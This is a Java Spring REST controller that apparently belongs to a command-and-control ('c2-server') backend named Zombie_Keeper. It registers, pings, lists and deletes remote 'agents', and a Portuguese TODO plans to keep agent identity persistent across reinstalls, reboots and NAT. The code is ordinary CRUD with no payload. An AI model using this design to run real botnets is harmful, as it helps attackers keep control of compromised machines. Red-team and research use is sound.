package com.manager.Zombie_Keeper.api.controller.agent;
import com.manager.Zombie_Keeper.exception.DuplicateAgentException;
import com.manager.Zombie_Keeper.model.entity.agent.Agent;
import com.manager.Zombie_Keeper.repository.agent.AgentRepository;
import com.manager.Zombie_Keeper.service.agents.AgentsService;

import org.springframework.web.bind.annotation.*;

import java.time.LocalDateTime;
import java.util.ArrayList;
import java.util.List;
import java.util.UUID;

@RestController
@RequestMapping("/c2-server/agents")
public class AgentRestController {

    private final AgentRepository agentRepository;
    private final AgentsService agentsService;

    public AgentRestController(AgentRepository agentRepository, AgentsService agentsService) {
        this.agentRepository = agentRepository;
        this.agentsService = agentsService;
    }

    @PostMapping("/register")
    public Agent registerAgent(@RequestBody Agent newAgent){
        /*
            TODO criar ---> >>  >> 

            Criar novo fluxo futuramente 
            Agent registra
            Backend retorna agentId
            Agent salva localmente (arquivo / registry)
            
            para os proximos registros usarem o memso id
            resolve:
            IP dinâmico
            reinstalação
            reboot
            NAT
            
        */
        
        if(( agentRepository.findByIpv4(newAgent.getIpv4()).isEmpty()) ){
            
            newAgent = agentsService.setPreInformation(newAgent);
            return agentRepository.save(newAgent);


        }

        throw new DuplicateAgentException("Agent duplicate.");
       
        
    }
    @PutMapping("/{id}/ping")
    public Agent pingAgent(@PathVariable UUID id){

        Agent agent = agentRepository.findById(id).orElse(null);

        if(agent != null){
            agent.setLastSeen(LocalDateTime.now());
            return agentRepository.save(agent);
        }
        return null;
    }

    @PutMapping("/{id}/delete")
    public void deleteAgent(@PathVariable UUID id){

        Agent agent = agentRepository.findById(id).orElse(null);


        if(agent != null){

            agentRepository.delete(agent);
        }else{

            System.out.println("Id " + id + " invalid");

        }

        

    }


    @GetMapping
    public List<Agent> getAllAgents(){

        List<Agent> agents = new ArrayList<>();

        agents = agentRepository.findAll();

        return agents;
    }

    @GetMapping("/{id}")

    public Agent getAgentDetails(@PathVariable UUID id){

        Agent agent = agentRepository.findById(id).orElse(null);

        if(agent != null){

            return agent;
        }

        return null;
    }


}